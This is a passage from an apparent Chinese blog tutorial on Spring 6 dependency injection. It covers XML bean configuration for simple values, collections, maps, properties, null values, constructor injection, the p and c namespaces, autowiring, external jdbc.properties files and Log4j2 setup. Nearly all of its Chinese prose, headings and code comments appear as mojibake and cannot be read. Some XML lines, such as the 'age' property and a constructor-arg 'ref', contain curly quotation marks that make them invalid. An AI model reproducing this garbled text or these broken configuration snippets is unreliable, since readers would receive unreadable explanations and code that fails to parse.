&lt;!--          å¨propertyæ ç­¾ä¸­ä½¿ç¨åµå¥beanï¼è¿å°±æ¯åé¨bean--&gt;
          &lt;bean class="com.ali.dao.OrderDao" &gt;&lt;/bean&gt;
      &lt;/property&gt;
    &lt;/bean&gt;
</code></pre>
<h4 id="æ³¨å¥ç®åç±»å">æ³¨å¥ç®åç±»å</h4>
<pre><code class="language-xml">&lt;!--    æ³¨å¥ç®åç±»åå±æ§--&gt;
&lt;bean id="userBean" class="com.ali.bean.User"&gt;
&lt;!--    ç®åç±»åèµå¼ä½¿ç¨valueå±æ§--&gt;
    &lt;property name="name" value="å¼ ä¸"&gt;&lt;/property&gt;
    &lt;property name="age" value="30"&gt;&lt;/property&gt;
    &lt;property name="password" value="123456"&gt;&lt;/property&gt;
    &lt;/bean&gt;
</code></pre>
<p>å®éå¼åä¸­ï¼ä¸è¬ä¸ä¼å§Dateç±»åå½ä½ç®åç±»åï¼ä¼ä½¿ç¨refæ¥æ³¨å¥Dateç±»å</p>
<h4 id="çº§èå±æ§èµå¼">çº§èå±æ§èµå¼</h4>
<pre><code class="language-xml">&lt;!--     ä½¿ç¨çº§èå±æ§èµå¼ï¼ç»studentBeançclazzå±æ§èµå¼å¿é¡»æsetãgetæ¹æ³--&gt;
&lt;!--        åéç½®clazz  åéç½®clazz.name--&gt;
    &lt;bean id="studentBean" class="com.ali.bean.Student"&gt;
        &lt;property name="name" value="æå"&gt;&lt;/property&gt;
        &lt;property name="clazz" ref="clazzBean"&gt;&lt;/property&gt;
        &lt;!--çº§èå±æ§èµå¼ï¼ç»studentBeançclazzå±æ§èµå¼
        è¿éçclazzæ¯Studentç±»ä¸­çå±æ§å
        clazz å¿é¡»æsetãgetæ¹æ³--&gt;
        &lt;property name="clazz.name" value="é«ä¸äºç­"&gt;&lt;/property&gt;
    &lt;/bean&gt;
    &lt;bean id="clazzBean" class="com.ali.bean.Clazz"&gt;
    &lt;/bean&gt;
</code></pre>
<h4 id="æ³¨å¥æ°ç»">æ³¨å¥æ°ç»</h4>
<pre><code class="language-xml">   &lt;!--    æ³¨å¥ç®åç±»åå±æ§--&gt;
&lt;bean id="userBean1" class="com.ali.bean.User"&gt;
&lt;!--    ç®åç±»åèµå¼ä½¿ç¨valueå±æ§--&gt;
    &lt;property name="name" value="å¼ ä¸"&gt;&lt;/property&gt;
    &lt;property name="age" value="30"&gt;&lt;/property&gt;
    &lt;property name="password" value="123456"&gt;&lt;/property&gt;
    &lt;/bean&gt;
    &lt;bean id="userBean2" class="com.ali.bean.User"&gt;
        &lt;!--    ç®åç±»åèµå¼ä½¿ç¨valueå±æ§--&gt;
        &lt;property name="name" value="å¼ ä¸"&gt;&lt;/property&gt;
        &lt;property name="age" value="30"&gt;&lt;/property&gt;
        &lt;property name="password" value="123456"&gt;&lt;/property&gt;
    &lt;/bean&gt;
    &lt;bean id="userBean3" class="com.ali.bean.User"&gt;
        &lt;!--    ç®åç±»åèµå¼ä½¿ç¨valueå±æ§--&gt;
        &lt;property name="name" value="å¼ ä¸"&gt;&lt;/property&gt;
        &lt;property name="age" value="30"&gt;&lt;/property&gt;
        &lt;property name="password" value="123456"&gt;&lt;/property&gt;
    &lt;/bean&gt;
   
   &lt;bean id="qdyBean" class="com.ali.bean.QDY"&gt;
&lt;!--        aihaoå±æ§æ¯ä¸ä¸ªå­ç¬¦ä¸²æ°ç»--&gt;
        &lt;property name="aihao"&gt;
            &lt;array&gt;
                &lt;value&gt;å&lt;/value&gt;
                &lt;value&gt;å&lt;/value&gt;
            &lt;/array&gt;
        &lt;/property&gt;
&lt;!--        friendsæ¯ä¸ä¸ªUserå¯¹è±¡æ°ç»--&gt;
        &lt;property name="friends"&gt;
            &lt;array&gt;
                &lt;ref bean="userBean1"&gt;&lt;/ref&gt;
                &lt;ref bean="userBean2"&gt;&lt;/ref&gt;
                &lt;ref bean="userBean3"&gt;&lt;/ref&gt;
            &lt;/array&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
</code></pre>
<h4 id="æ³¨å¥liståsetç±»å">æ³¨å¥ListåSetç±»å</h4>
<pre><code class="language-xml">    &lt;bean id="personBean" class="com.ali.bean.Person"&gt;
&lt;!--        namesæ¯ List&lt;String&gt; ç±»å--&gt;
        &lt;property name="names"&gt;
            &lt;list&gt;
                &lt;value&gt;å¼ ä¸&lt;/value&gt;
                &lt;value&gt;éæ¯&lt;/value&gt;
                &lt;value&gt;è©¹å§æ&lt;/value&gt;
            &lt;/list&gt;
        &lt;/property&gt;
&lt;!--        address æ¯ Set&lt;String&gt;   ç±»å--&gt;
        &lt;property name="address"&gt;
            &lt;set&gt;
                &lt;value&gt;åäº¬&lt;/value&gt;
                &lt;value&gt;ä¸æµ·&lt;/value&gt;
                &lt;value&gt;å¹¿å·&lt;/value&gt;
            &lt;/set&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
</code></pre>
<h4 id="æ³¨å¥mapéå">æ³¨å¥Mapéå</h4>
<pre><code class="language-xml">&lt;!--      phone æ¯ä¸ä¸ªMap&lt;Integer, String&gt;ç±»å
      å¦ækeyæ¯ç®åç±»åï¼å¯ä»¥ç´æ¥ä½¿ç¨entryæ ç­¾çkeyå±æ§èµå¼
      å¦ækeyæ¯å¤æç±»åï¼å¯ä»¥ä½¿ç¨
      &lt;entry key-ref="keyBean" value-ref="valueBean"&gt;&lt;/entry&gt;
      valueåç--&gt;
      &lt;property name="phone"&gt;
          &lt;map&gt;
              &lt;entry key="1" value="13800138000"&gt;&lt;/entry&gt;
              &lt;entry key="2" value="13900139000"&gt;&lt;/entry&gt;
              &lt;entry key="3" value="13700137000"&gt;&lt;/entry&gt;
          &lt;/map&gt;
      &lt;/property&gt;
</code></pre>
<h4 id="æ³¨å¥propertiesç±»å">æ³¨å¥Propertiesç±»å</h4>
<pre><code class="language-xml">&lt;!--        Properties çkey åvalueåªè½æ¯å­ç¬¦ä¸²ç±»å--&gt;
        &lt;property name="properties"&gt;
            &lt;props&gt;
                &lt;prop key="k1"&gt;v1&lt;/prop&gt;
                &lt;prop key="k2"&gt;v2&lt;/prop&gt;
                &lt;prop key="k3"&gt;v3&lt;/prop&gt;
            &lt;/props&gt;
        &lt;/property&gt;
</code></pre>
<h4 id="æ³¨å¥nullåç©ºå­ç¬¦ä¸²">æ³¨å¥nullåç©ºå­ç¬¦ä¸²</h4>
<pre><code class="language-xml">&lt;!--        ä»¥ä¸æ¯æå¨æ³¨å¥null--&gt;
        &lt;property name="name" &gt;
            &lt;null&gt;&lt;/null&gt;
        &lt;/property&gt;
        &lt;!--        ä¸ç»å±æ§æ³¨å¥ï¼å±æ§çé»è®¤å¼æ¯null--&gt;
&lt;!--        &lt;property name="name" value="tom"&gt;&lt;/property&gt;--&gt;
&lt;!--       æ³¨å¥ç©ºå­ç¬¦ä¸²æ¹å¼ä¸ --&gt;
        &lt;property name="name" value=""&gt;&lt;/property&gt;
&lt;!--        æ³¨å¥ç©ºå­ç¬¦ä¸²æ¹å¼äº --&gt;
        &lt;property name="name" &gt;
            &lt;value&gt;&lt;/value&gt;
        &lt;/property&gt;
        &lt;property name="age" value=â31â&gt;&lt;/property&gt;
</code></pre>
<h4 id="æ³¨å¥ç¹æ®å­ç¬¦ä¸²">æ³¨å¥ç¹æ®å­ç¬¦ä¸²</h4>
<pre><code class="language-xml"> &lt;bean id="mathBean" class="com.ali.bean.MathBean"&gt;
        &lt;!--     ç¬¬ä¸ç§ï¼ä½¿ç¨å®ä½ç¬¦å·ä»£æ¿ç¹æ®ç¬¦å·    2&lt;3 --&gt;
&lt;!--        &lt;property name="result" value="2 &amp;lt; 3"&gt;&lt;/property&gt;--&gt;
        &lt;!--     ç¬¬äºç§ï¼ä½¿ç¨&lt;![CDATA[]]&gt; è¿éé¢çåå®¹ä¸ä¼è¢«xmlè§£æ    2&lt;3 --&gt;
        &lt;property name="result"&gt;
&lt;!--            åªè½ä½¿ç¨valueæ ç­¾--&gt;
            &lt;value&gt;&lt;![CDATA[2&lt;3]]&gt;&lt;/value&gt;
        &lt;/property&gt;
    &lt;/bean&gt;
</code></pre>
<h3 id="æé æ³¨å¥">æé æ³¨å¥</h3>
<ol>
<li>éç½®æä»¶éç½®bean</li>
</ol>
<pre><code class="language-xml">    &lt;bean id="userDaoBean" class="com.ali.dao.UserDao"&gt;
    &lt;/bean&gt;
&lt;!--     æé æ³¨å¥--&gt;
    &lt;bean class="com.ali.service.CustomerService" id="customerService"&gt;
&lt;!--        æå®æé æ¹æ³çç¬¬ä¸ä¸ªåæ°ï¼ä¸æ æ¯0--&gt;
        &lt;constructor-arg index="0" ref="userDaoBean"&gt;&lt;/constructor-arg&gt;
        &lt;!--        æ ¹æ®åæ°åæ³¨å¥--&gt;
        &lt;constructor-arg name="userDao" ref="userDaoBeanâ&gt;&lt;/constructor-arg&gt;
    &lt;/bean&gt;
</code></pre>
<ol start="2">
<li>å¨ç±»ä¸­åæé æ¹æ³</li>
</ol>
<pre><code class="language-java">public class CustomerService {

    private UserDao userDao;

    public CustomerService(UserDao userDao) {
        this.userDao = userDao;
    }

    public  void save(){
        userDao.insertUser();
    }
}
</code></pre>
<h3 id="på½åç©ºé´æ³¨å¥ç®åsetæ³¨å¥">på½åç©ºé´æ³¨å¥ï¼ç®åsetæ³¨å¥ï¼</h3>
<pre><code class="language-xml">&lt;!--  på½åç©ºé´æ³¨å¥åºå±è¿æ¯setæ³¨å¥ï¼ç±»ä¸­çå±æ§å¿é¡»æsetæ¹æ³ï¼ï¼åªä¸è¿på½åç©ºé´æ³¨å¥è®©springéç½®æ´å ç®å
  1.å¨springéç½®æä»¶å¤´é¨æ·»å på½åç©ºé´ã  xmlns:p="http://www.springframework.org/schema/p"
  2.ä½¿ç¨på½åç©ºé´æ³¨å¥å±æ§ï¼è¯­æ³ï¼p:å±æ§å="å±æ§å¼"  p:å±æ§å-ref="å¼ç¨ç±»åå±æ§å¼"--&gt;
  &lt;bean id="dogBean" class="com.ali.bean.Dog" p:age="22" p:name="å¼ ä¸" p:birthday-ref="birthdayBean"/&gt;

  &lt;bean id="birthdayBean" class="java.util.Date" /&gt;
</code></pre>
<h3 id="cå½åç©ºé´æ³¨å¥ç®åæé æ³¨å¥">cå½åç©ºé´æ³¨å¥ï¼ç®åæé æ³¨å¥ï¼</h3>
<pre><code class="language-xml">&lt;!--  cå½åç©ºé´æ³¨å¥åºå±è¿æ¯æé å¨æ³¨å¥ï¼ç±»ä¸­å¿é¡»æå¯¹åºçæé å¨ï¼ï¼åªä¸è¿cå½åç©ºé´æ³¨å¥è®©springéç½®æ´å ç®å
  1.å¨springéç½®æä»¶å¤´é¨æ·»å cå½åç©ºé´ã  xmlns:c="http://www.springframework.org/schema/c"
  2.ä½¿ç¨cå½åç©ºé´æ³¨å¥å±æ§ï¼è¯­æ³ï¼c:å±æ§å="å±æ§å¼"  c:å±æ§å-ref="å¼ç¨ç±»åå±æ§å¼"
  c:_0 ä¸æ æ¹å¼   c:name  åæ°åæ¹å¼--&gt;
&lt;bean id="peopleBean" class="com.ali.bean.People" c:name="åªåª" c:age="3" c:sex="true"/&gt;
</code></pre>
<h3 id="åºäºxmlçèªå¨è£ébyname">åºäºxmlçèªå¨è£ébyName</h3>
<pre><code class="language-xml">&lt;!--        èªå¨è£éï¼byNameã ä¹æ¯åºäºsetç--&gt;
&lt;!--    æ ¹æ®åå­èªå¨è£éï¼å¶ä¸­OrderDaoæ¯OrderServiceéé¢çä¸ä¸ªå±æ§ãå¿é¡»æsetæ¹æ³--&gt;
    &lt;bean id="orderServiceBean" class="com.ali.service.OrderService" autowire="byName"&gt;&lt;/bean&gt;

&lt;!--    è¿ä¸ªid å¿é¡»æ¯OrderServiceä¸­setæ¹æ³å»æâsetâåé¦å­æ¯å°å--&gt;
    &lt;bean id="orderDao" class="com.ali.dao.OrderDao"&gt;&lt;/bean&gt;
</code></pre>
<h3 id="åºäºxmlçèªå¨è£ébytype">åºäºxmlçèªå¨è£ébyType</h3>
<pre><code class="language-xml">&lt;!--     æ ¹æ®ç±»åèªå¨è£éï¼èªå¨è£éæ¯åºäºsetæ¹æ³ç
         æ ¹æ®ç±»åè¿è¡èªå¨è£éæ¶ï¼éç½®æä»¶ä¸­æä¸ªç±»åçå®ä¾åªè½æä¸ä¸ª
         --&gt;
    &lt;bean class="com.ali.dao.VipDao"&gt;&lt;/bean&gt;
    &lt;bean class="com.ali.dao.UserDao"&gt;&lt;/bean&gt;
&lt;!--    CustomerServiceç±»éé¢VipDaoåUserDaoå±æ§ï¼è¿2ä¸ªå±æ§å¿é¡»æsetæ¹æ³æè½èªå¨æ³¨å¥ä¸é¢2ä¸ªbean--&gt;
    &lt;bean id="customerServiceBean" class="com.ali.service.CustomerService" autowire="byType"&gt;&lt;/bean&gt;

&lt;/beans&gt;
</code></pre>
<h3 id="å¼å¥å¤é¨çå±æ§éç½®æä»¶">å¼å¥å¤é¨çå±æ§éç½®æä»¶</h3>
<pre><code class="language-xml">   &lt;!-- å¼å¥å¤é¨çpropertiesæä»¶
     ç¬¬ä¸æ­¥ï¼å¼å¥contextå½åç©ºé´ xmlns:context="http://www.springframework.org/schema/context"
    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd
     ç¬¬äºæ­¥ï¼ä½¿ç¨&lt;context:property-placeholder&gt;æ ç­¾å¼å¥å¤é¨çpropertiesæä»¶,é»è®¤ä»ç±»çæ ¹è·¯å¾ä¸å è½½
     --&gt;
    &lt;context:property-placeholder location="classpath:jdbc.properties"/&gt;

    &lt;bean id="mydataSource" class="com.ali.bean.MyDataSource"&gt;
        &lt;!-- ä½¿ç¨${}å ä½ç¬¦å¼ç¨å¤é¨propertiesæä»¶ä¸­çå±æ§å¼ è¿4ä¸ªå±æ§å¿é¡»æsetæ¹æ³--&gt;
        &lt;property name="driver" value="${jdbc.diverClass}"/&gt;
        &lt;property name="url" value="${jdbc.url}"/&gt;
        &lt;property name="username" value="${jdbc.username}"/&gt;
        &lt;property name="password" value="${jdbc.password}"/&gt;
    &lt;/bean&gt;
</code></pre>
<p>jdbc.propertiesæä»¶</p>
<pre><code class="language-properties">jdbc.diverClass=com.mysql.cj.jdbc.Driver
jdbc.url=jdbc:mysql://localhost:3306/spring6db?useSSL=false&amp;server
jdbc.username=root
jdbc.password=123456
</code></pre>
<h1 id="springæä¹å®ä¾åå¯¹è±¡">springæä¹å®ä¾åå¯¹è±¡ï¼</h1>
<p>é»è®¤æåµä¸springéè¿åå°æºå¶ï¼è°ç¨ç±»çæ åæ°æé æ¹æ³å®ä¾åå¯¹è±¡</p>
<p>æåå»ºå¥½çå¯¹è±¡å­å¨å°Mapç»æä¸­ã</p>
<p>å½æå¤ä¸ªéç½®æä»¶æ¶ï¼å¯è¯»åå¤ä¸ªéç½®æä»¶</p>
<pre><code class="language-java">ApplicationContext context = new ClassPathXmlApplicationContext("spring.xml","spring-dao.xml");
</code></pre>
<p>å¯ä»¥å¨éç½®æä»¶ä¸­æ³¨å¥jdkèªå¸¦çç±»ï¼åªè¦è¿ä¸ªç±»ææ åæ°æé æ¹æ³å°±è¡ã</p>
<p>getBeanï¼ï¼æ¶ï¼Beançidä¸å­å¨æ¶ä¼æ¥é</p>
<h2 id="ä»ç±»è·¯å¾ä¹å¤çè·¯å¾è·åxmléç½®æä»¶">ä»ç±»è·¯å¾ä¹å¤çè·¯å¾è·åxmléç½®æä»¶</h2>
<pre><code class="language-java">// è¯»åç±»è·¯å¾ä¹å¤çéç½®æä»¶
ApplicationContext context = new FileSystemXmlApplicationContext("D:/applicationContext.xml");
Object user=  context.getBean("user"); // è·åspringå®¹å¨ä¸­çå¯¹è±¡
</code></pre>
<p>ApplicationContextçè¶çº§ç¶æ¥å£æ¯BeanFactoryã</p>
<p>BeanFactoryæ¯Iocå®¹å¨çé¡¶çº§æ¥å£ã</p>
<p>springçIocå®¹å¨åºå±ä½¿ç¨äºå·¥åæ¨¡å¼ã</p>
<h1 id="å¯ç¨log4j2">å¯ç¨Log4j2</h1>
<p>spring5ä¹åæ¯æLog4j2æ¡æ¶ã</p>
<ol>
<li>å¼å¥ä¾èµ</li>
</ol>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
    &lt;artifactId&gt;log4j-slf4j2-impl&lt;/artifactId&gt;
    &lt;version&gt;2.19.0&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
    &lt;version&gt;2.19.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<ol>
<li>ç¼åéç½®æä»¶ï¼æä»¶åå¿é¡»æ¯log4j2.xmlï¼æ¾å¨ç±»æ ¹è·¯å¾ä¸</li>
</ol>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;configuration&gt;

    &lt;loggers&gt;
        &lt;!--
            levelæå®æ¥å¿çº§å«ï¼ä»ä½å°é«çä¼åçº§ï¼
                ALL &lt; TRACE &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF
        --&gt;
        &lt;root level="DEBUG"&gt;
            &lt;appender-ref ref="spring6log"/&gt;
        &lt;/root&gt;
    &lt;/loggers&gt;

    &lt;appenders&gt;
        &lt;!--è¾åºæ¥å¿ä¿¡æ¯å°æ§å¶å°--&gt;
        &lt;console name="spring6log" target="SYSTEM_OUT"&gt;
            &lt;!--æ§å¶æ¥å¿è¾åºçæ ¼å¼--&gt;
            &lt;PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss SSS} [%t] %-3level %logger{1024} - %msg%n"/&gt;
        &lt;/console&gt;
    &lt;/appenders&gt;

&lt;/configuration&gt;
</code></pre>
<ol>
<li>ä½¿ç¨æ¥å¿æ¡æ¶ ï¼å¨SpringTest01ç±»ä¸­ä½¿ç¨å¦ä¸ä»£ç </li>
</ol>
<pre><code class="language-java">Logger logger = LoggerFactory.getLogger(SpringTest01.class);
logger.info("æ¥å¿ä¿¡æ¯");
</code></pre>


</div>
<div id="MySignature" role="contentinfo">
    <p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/alineverstop/" target="_blank">NE_STOP</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/alineverstop/p/19563560" target="_blank">https://www.cnblogs.com/alineverstop/p/19563560</a></p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 12:12">2026-02-02 12:12</span>&nbsp;
<a href="https://www.cnblogs.com/alineverstop">NE_STOP</a>&nbsp;
éè¯»(<span id="post_view_count">90</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19563560);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19563560', targetLink: 'https://www.cnblogs.com/alineverstop/p/19563560', title: 'spring6-å¤ç§ç±»åçæ³¨å¥æ¹å¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>